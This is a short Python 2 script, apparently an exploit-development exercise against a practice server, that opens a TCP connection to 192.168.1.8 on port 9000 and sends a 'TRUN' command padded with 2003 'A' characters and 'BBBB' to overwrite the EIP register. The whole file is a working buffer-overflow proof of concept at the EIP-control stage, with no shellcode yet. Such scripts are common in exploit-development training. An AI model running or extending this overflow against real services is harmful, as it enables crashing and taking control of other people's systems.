#!/usr/bin/python
import socket
import sys
 
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
try:
    s.connect(('192.168.1.8', 9000))

    buff = "TRUN /.:/" 
    buff += "A" * 2003 #offset_value     
    buff += "BBBB"     #control_EIP

except:
     print "Error" 
     sys.exit(0)
 
s.recv(1024)
s.send(buff)
#s.close()







